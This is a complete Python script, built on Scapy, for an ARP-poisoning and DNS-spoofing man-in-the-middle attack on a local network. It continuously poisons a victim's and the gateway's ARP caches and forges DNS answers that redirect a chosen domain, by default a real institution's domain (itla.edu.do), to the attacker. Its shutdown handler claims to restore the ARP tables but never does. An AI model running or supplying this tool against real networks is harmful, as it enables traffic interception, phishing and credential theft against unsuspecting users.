#!/usr/bin/env python3

"""
Combined ARP + DNS Spoofing - Full MITM attack
Usage: sudo python3 mitm_dns.py -i eth0 -t 192.168.1.50 -g 192.168.1.1 -d itla.edu.do -a 192.168.1.100
"""

from scapy.all import *
import argparse
import sys
import os
import threading
import time
import signal
from termcolor import colored
from pwn import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def handler(sig, frame):
    print(colored("\n[!] Stopping attack and restoring ARP tables...\n", 'red'))
    sys.exit(0)

signal.signal(signal.SIGINT, handler)

def get_arguments():
    parser = argparse.ArgumentParser(
        description="ARP + DNS Spoofing - Full MITM",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 mitm_dns.py -i eth0 -t 192.168.1.50 -g 192.168.1.1 -d itla.edu.do -a 192.168.1.100
        """
    )
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-t", "--target", required=True, help="Victim IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    parser.add_argument("-d", "--domain", default="itla.edu.do", help="Domain to spoof")
    parser.add_argument("-a", "--address", help="Fake IP for domain (default: your IP)")
    
    return parser.parse_args()

def get_mac(ip, interface):
    """Get MAC from IP"""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                     timeout=2, iface=interface, verbose=False)
        return ans[0][1].hwsrc if ans else None
    except:
        return None

def get_ip(interface):
    """Get interface IP"""
    try:
        return get_if_addr(interface)
    except:
        return "192.168.1.100"

def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac, attacker_mac, interface):
    """ARP spoofing thread"""
    # Poison victim: gateway is at attacker
    pkt_to_victim = Ether(dst=target_mac, src=attacker_mac)/ARP(
        op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=attacker_mac)
    
    # Poison gateway: victim is at attacker  
    pkt_to_gateway = Ether(dst=gateway_mac, src=attacker_mac)/ARP(
        op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=attacker_mac)
    
    sendp(pkt_to_victim, iface=interface, verbose=False)
    sendp(pkt_to_gateway, iface=interface, verbose=False)

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, interface):
    """Restore ARP tables"""
    sendp(Ether(dst=target_mac)/ARP(op=2, psrc=gateway_ip, pdst=target_ip, 
                                    hwsrc=gateway_mac, hwdst=target_mac), iface=interface)
    sendp(Ether(dst=gateway_mac)/ARP(op=2, psrc=target_ip, pdst=gateway_ip,
                                    hwsrc=target_mac, hwdst=gateway_mac), iface=interface)
    print(colored("[+] ARP tables restored", 'green'))

def dns_spoof(pkt, target_domain, spoof_ip, interface):
    """Create and send spoofed DNS response"""
    if DNS in pkt and pkt[DNS].qr == 0:  # DNS query
        qname = pkt[DNS].qd.qname.decode()
        
        if target_domain in qname:
            print(colored(f"[+] DNS Query: {qname}", 'green'))
            
            # Build response
            resp = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                   UDP(dport=pkt[UDP].sport, sport=53)/\
                   DNS(id=pkt[DNS].id, qr=1, aa=1, ra=1,
                       qd=pkt[DNS].qd,
                       an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=3600, rdata=spoof_ip))
            
            send(resp, iface=interface, verbose=False)
            print(colored(f"    -> Spoofed: {qname} = {spoof_ip}", 'yellow'))
            return True
    return False

def main():
    if os.geteuid() != 0:
        print(colored("[-] Root required", 'red'))
        sys.exit(1)
    
    args = get_arguments()
    
    # Get attacker info
    attacker_ip = get_ip(args.interface)
    attacker_mac = get_if_hwaddr(args.interface)
    spoof_ip = args.address if args.address else attacker_ip
    
    print(colored(f"\n[*] Starting ARP + DNS Spoofing", 'blue'))
    print(f"[*] Interface: {args.interface}")
    print(f"[*] Attacker IP: {attacker_ip}")
    print(f"[*] Victim: {args.target}")
    print(f"[*] Gateway: {args.gateway}")
    print(colored(f"[*] Spoofing: {args.domain} -> {spoof_ip}", 'yellow'))
    print(colored("[!] Press Ctrl+C to stop and restore\n", 'red'))
    
    # Get MACs
    print("[*] Getting MAC addresses...")
    target_mac = get_mac(args.target, args.interface)
    gateway_mac = get_mac(args.gateway, args.interface)
    
    if not target_mac or not gateway_mac:
        print(colored("[-] Could not get MAC addresses", 'red'))
        sys.exit(1)
    
    print(colored(f"[+] Target MAC: {target_mac}", 'green'))
    print(colored(f"[+] Gateway MAC: {gateway_mac}", 'green'))
    
    # Start ARP spoofing thread
    def arp_thread():
        while True:
            arp_spoof(args.target, target_mac, args.gateway, gateway_mac, attacker_mac, args.interface)
            time.sleep(2)
    
    thread = threading.Thread(target=arp_thread, daemon=True)
    thread.start()
    
    print(colored("[*] ARP spoofing started", 'blue'))
    print(colored("[*] DNS spoofing started\n", 'blue'))
    
    # DNS spoofing
    dns_count = 0
    p1 = log.progress("DNS Spoofed")
    
    def handle_packet(pkt):
        nonlocal dns_count
        if dns_spoof(pkt, args.domain, spoof_ip, args.interface):
            dns_count += 1
            p1.status(colored(f"{dns_count} queries", 'cyan'))
    
    # Sniff DNS packets
    sniff(iface=args.interface, filter="udp port 53", prn=handle_packet, store=0)

if __name__ == "__main__":
    main()
